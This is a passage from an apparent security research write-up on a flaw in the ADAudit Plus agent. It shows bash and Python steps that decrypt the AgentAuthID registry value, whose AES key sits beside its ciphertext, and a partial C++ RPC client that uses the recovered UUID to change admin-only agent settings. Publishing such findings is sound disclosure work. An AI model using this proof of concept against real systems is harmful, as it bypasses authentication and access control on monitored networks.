&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;17&lt;/span&gt;:	    	plainTextLength += &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; - plainTextLength % &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 18 adds 1 to our &lt;code&gt;plainTextIndex&lt;/code&gt; to point at the first byte after &lt;code&gt;\&lt;/code&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;18&lt;/span&gt;:	    	plainTextIndex++;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Line 19-27 is the decryption process:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;Line 21 create an AES key with bytes stored at &lt;code&gt;plainTextIndex (3)&lt;/code&gt; + 32 bytes&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;21&lt;/span&gt;:	aes.Key = cipherText.Skip(plainTextIndex).Take(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt;).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;This can be recreated in bash by, base64 decode the &lt;code&gt;AgentAuthID&lt;/code&gt; and pipe it
to xxd. &lt;code&gt;-s 3&lt;/code&gt; to set starting byte at 3, &lt;code&gt;-l 32&lt;/code&gt; to stop after 32 bytes and finally &lt;code&gt;-c 200&lt;/code&gt;
to disable output formatting. The output should be our AES key.&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ echo -n MzZ&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;N0a | base64 -d | xxd -s &lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt; -l &lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; -c &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000003: e365 d4d1 2f70 &lt;span style=&#34;color:#ae81ff&#34;&gt;7754&lt;/span&gt; 2a0e 1c59 7fb7 63cf 795a 06cc 0c63 9eca e47d 1a31 c944 &lt;span style=&#34;color:#ae81ff&#34;&gt;6169&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 22 creates an AES Initialization Vector (IV)  from the bytes stored at (32+3) + 16&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;22&lt;/span&gt;:	aes.IV = cipherText.Skip(&lt;span style=&#34;color:#ae81ff&#34;&gt;32&lt;/span&gt; + plainTextIndex).Take(&lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt;).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ echo -n MzZ&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;N0a | base64 -d | xxd -s &lt;span style=&#34;color:#ae81ff&#34;&gt;35&lt;/span&gt; -l &lt;span style=&#34;color:#ae81ff&#34;&gt;16&lt;/span&gt; -c &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000023: d2fa &lt;span style=&#34;color:#ae81ff&#34;&gt;2032&lt;/span&gt; eb0b 272a e177 d536 0a37 0f0b
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;Line 23 fetches the cipherText from our &lt;code&gt;AgentAuthID&lt;/code&gt; at byte (48+3) until &lt;code&gt;plainTextLength&lt;/code&gt; (36)&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-c#&#34; data-lang=&#34;c#&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;23&lt;/span&gt;:	cipherText = cipherText.Skip(&lt;span style=&#34;color:#ae81ff&#34;&gt;48&lt;/span&gt; + plainTextIndex).Take(plainTextLength).ToArray&amp;lt;&lt;span style=&#34;color:#66d9ef&#34;&gt;byte&lt;/span&gt;&amp;gt;();
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ echo -n MzZ&lt;span style=&#34;color:#f92672&#34;&gt;[&lt;/span&gt;...&lt;span style=&#34;color:#f92672&#34;&gt;]&lt;/span&gt;N0a | base64 -d | xxd -s &lt;span style=&#34;color:#ae81ff&#34;&gt;51&lt;/span&gt; -l &lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt; -c &lt;span style=&#34;color:#ae81ff&#34;&gt;200&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;00000033: &lt;span style=&#34;color:#ae81ff&#34;&gt;9350&lt;/span&gt; f78a 3c6a 11c5 5c0d a306 dd20 6d04 953b fca5 ff13 256c f47f ff43 e5d9 9ff3 &lt;span style=&#34;color:#ae81ff&#34;&gt;8690&lt;/span&gt; d716
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;To summarize, the &lt;code&gt;AgentAuthID&lt;/code&gt; that is stored in the Windows registry is a
base64 blob, containing the length of the plaintext, the AES key, the
Initialization Vector and the encrypted text. With this information we should
be able to decrypt ciphertext.&lt;/p&gt;
&lt;p&gt;Here is a bash one-liner to extract our requirements:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ bytes&lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;$(&lt;/span&gt;echo -n MzZc42XU0S9wd1QqDhxZf7djz3laBswMY57K5H0aMclEYWnS+iAy6wsnKuF31TYKNw8Lk1D3ijxqEcVcDaMG3SBtBJU7/KX/EyVs9H//Q+XZn/OGkNcW4Of7b8mNXHKI0N0a | base64 -d | xxd -p -c 200&lt;span style=&#34;color:#66d9ef&#34;&gt;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ echo -e &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Length: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;bytes:0:4&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\nKey: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;bytes:6:64&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\nIV: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;bytes:70:32&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;\nciphertext: &lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;${&lt;/span&gt;bytes:102:174&lt;span style=&#34;color:#e6db74&#34;&gt;}&lt;/span&gt;&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Length: &lt;span style=&#34;color:#ae81ff&#34;&gt;3336&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;Key: e365d4d12f7077542a0e1c597fb763cf795a06cc0c639ecae47d1a31c9446169
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;IV: d2fa2032eb0b272ae177d5360a370f0b
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext: 9350f78a3c6a11c55c0da306dd206d04953bfca5ff13256cf47fff43e5d99ff38690d716e0e7fb6fc98d5c7288d0dd1a
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Note that the output above is in HEX string format. Meaning that &lt;code&gt;Length:&lt;/code&gt; is
two bytes which can be converted to ASCII:&lt;/p&gt;
&lt;table&gt;
&lt;thead&gt;
&lt;tr&gt;
&lt;th&gt;HEX String&lt;/th&gt;
&lt;th&gt;HEX&lt;/th&gt;
&lt;th&gt;DEC&lt;/th&gt;
&lt;th&gt;ASCII&lt;/th&gt;
&lt;/tr&gt;
&lt;/thead&gt;
&lt;tbody&gt;
&lt;tr&gt;
&lt;td&gt;33&lt;/td&gt;
&lt;td&gt;0x33&lt;/td&gt;
&lt;td&gt;51&lt;/td&gt;
&lt;td&gt;3&lt;/td&gt;
&lt;/tr&gt;
&lt;tr&gt;
&lt;td&gt;36&lt;/td&gt;
&lt;td&gt;0x36&lt;/td&gt;
&lt;td&gt;54&lt;/td&gt;
&lt;td&gt;6&lt;/td&gt;
&lt;/tr&gt;
&lt;/tbody&gt;
&lt;/table&gt;
&lt;p&gt;Lets try to decrypt the ciphertext using python3:&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-python3&#34; data-lang=&#34;python3&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#f92672&#34;&gt;from&lt;/span&gt; Crypto.Cipher &lt;span style=&#34;color:#f92672&#34;&gt;import&lt;/span&gt; AES
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;# pip3 install pycryptodome&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;key &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;e365d4d12f7077542a0e1c597fb763cf795a06cc0c639ecae47d1a31c9446169&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;iv &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;d2fa2032eb0b272ae177d5360a370f0b&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;ciphertext &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; bytes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;fromhex(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;9350f78a3c6a11c55c0da306dd206d04953bfca5ff13256cf47fff43e5d99ff38690d716e0e7fb6fc98d5c7288d0dd1a&amp;#34;&lt;/span&gt;)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;aes &lt;span style=&#34;color:#f92672&#34;&gt;=&lt;/span&gt; AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;new(key, AES&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;MODE_CBC, iv)
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;print(aes&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decrypt(ciphertext)&lt;span style=&#34;color:#f92672&#34;&gt;.&lt;/span&gt;decode(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#39;utf-8&amp;#39;&lt;/span&gt;))
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-bash&#34; data-lang=&#34;bash&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ python3 decrypt_agentauthid.py
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;75fdc297-acc9-4ddb-83da-313cd909f3d6
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;user@adpen1:~$ echo -n 75fdc297-acc9-4ddb-83da-313cd909f3d6 | wc -c
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#ae81ff&#34;&gt;36&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;Very nice. We have UUID, and yes it was 36 characters long. We can test
this as authentication when we communicate with the ADAudit Agent.&lt;/p&gt;
&lt;p&gt;Once again we attempt to change the registry item &lt;code&gt;SMStatus&lt;/code&gt; to &amp;ldquo;True&amp;rdquo; to enable
the SessionMonitoring process, an action which should only be available
to administrators.&lt;/p&gt;
&lt;p&gt;POC:&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;adauditagent-rpc-activating-smstatus-with-agenauthid.png&#34; alt=&#34;adauditagent-rpc-activating-smstatus-with-agenauthid&#34;&gt;&lt;/p&gt;
&lt;p&gt;The &lt;code&gt;adauditrpc-client&lt;/code&gt; has be updated with input arguments and the latest
version will be found at our github page &lt;a href=&#34;https://github.com/shelltrail/adauditrpc-client&#34;&gt;https://github.com/shelltrail/adauditrpc-client&lt;/a&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-csharp&#34; data-lang=&#34;csharp&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;/* file: adauditrpc-client.cpp */&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;stdlib.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;stdio.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;ctype.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ADAPAgentRpcPipe_h.h&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;windows.h&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#75715e&#34;&gt;#pragma comment(lib, &amp;#34;rpcrt4.lib&amp;#34;)&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#960050;background-color:#1e0010&#34;&gt;#&lt;/span&gt;include &amp;lt;iostream&amp;gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; wmain(&lt;span style=&#34;color:#66d9ef&#34;&gt;int&lt;/span&gt; argc, wchar_t* argv[])
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;{
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;if&lt;/span&gt; (argc &amp;lt; &lt;span style=&#34;color:#ae81ff&#34;&gt;5&lt;/span&gt;) {
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        wprintf(L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Usage: %ls &amp;lt;IP&amp;gt; &amp;lt;AgentGUID&amp;gt; &amp;lt;case&amp;gt; &amp;lt;inputdata&amp;gt;\n&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        wprintf(L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Example - Enable SessionMonitoring: %ls 127.0.0.1 \&amp;#34;1699964702085\&amp;#34; 0 \&amp;#39;\&amp;#34;\&amp;#34;\&amp;#34;SMData\&amp;#34;\&amp;#34;\&amp;#34;:{\&amp;#34;\&amp;#34;\&amp;#34;SMStatus\&amp;#34;\&amp;#34;\&amp;#34;:\&amp;#34;\&amp;#34;\&amp;#34;True\&amp;#34;\&amp;#34;\&amp;#34;}\&amp;#39;\n&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        wprintf(L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;Example - Enable Debug: %ls 127.0.0.1 \&amp;#34;1699964702085\&amp;#34; 8 \&amp;#39;\&amp;#34;\&amp;#34;\&amp;#34;ENABLE_DEBUG\&amp;#34;\&amp;#34;\&amp;#34;:true\&amp;#39;\n&amp;#34;&lt;/span&gt;, argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;0&lt;/span&gt;]);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;        &lt;span style=&#34;color:#66d9ef&#34;&gt;return&lt;/span&gt; &lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    }
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; wchar_t* ip = argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;1&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR NetworkAddress = (RPC_WSTR)ip;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Accessing ADAPAgentRpcPipe named pipe on: %ls\n&amp;#34;&lt;/span&gt;, ip);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; wchar_t* agentuid = argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;2&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Using AgentUID: %ls\n&amp;#34;&lt;/span&gt;, agentuid);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;long&lt;/span&gt; arg_0 = std::wcstol(argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;3&lt;/span&gt;], nullptr, &lt;span style=&#34;color:#ae81ff&#34;&gt;10&lt;/span&gt;);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    printf(&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] Case: %i\n&amp;#34;&lt;/span&gt;, arg_0);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#66d9ef&#34;&gt;const&lt;/span&gt; wchar_t* inputdata = argv[&lt;span style=&#34;color:#ae81ff&#34;&gt;4&lt;/span&gt;];
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    wchar_t str1[&lt;span style=&#34;color:#ae81ff&#34;&gt;256&lt;/span&gt;] = L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;{\&amp;#34;AgentUID\&amp;#34;:\&amp;#34;&amp;#34;&lt;/span&gt;; &lt;span style=&#34;color:#75715e&#34;&gt;// Make sure the array is large enough&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    wcscat_s(str1, agentuid); &lt;span style=&#34;color:#75715e&#34;&gt;// Concatenates str1 and agentuid&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    wcscat_s(str1, L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\&amp;#34;,&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// Concatenates str1 and ,&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    wcscat_s(str1, inputdata); &lt;span style=&#34;color:#75715e&#34;&gt;// Concatenates str1 and inputdata&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    wcscat_s(str1, L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;}&amp;#34;&lt;/span&gt;); &lt;span style=&#34;color:#75715e&#34;&gt;// Concatenates str1 with }&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    wprintf(L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;[+] InputData: %ls\n&amp;#34;&lt;/span&gt;, str1);
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_STATUS status;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR pszUuid = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR pszProtocolSequence = (RPC_WSTR)L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;ncacn_np&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    &lt;span style=&#34;color:#75715e&#34;&gt;//RPC_WSTR pszNetworkAddress = (RPC_WSTR)L&amp;#34;100.64.5.212&amp;#34;;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR pszNetworkAddress = NetworkAddress;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR pszEndpoint = (RPC_WSTR)L&lt;span style=&#34;color:#e6db74&#34;&gt;&amp;#34;\\pipe\\ADAPAgentRpcPipe&amp;#34;&lt;/span&gt;;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR pszOptions = NULL;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;    RPC_WSTR pszStringBinding = NULL;
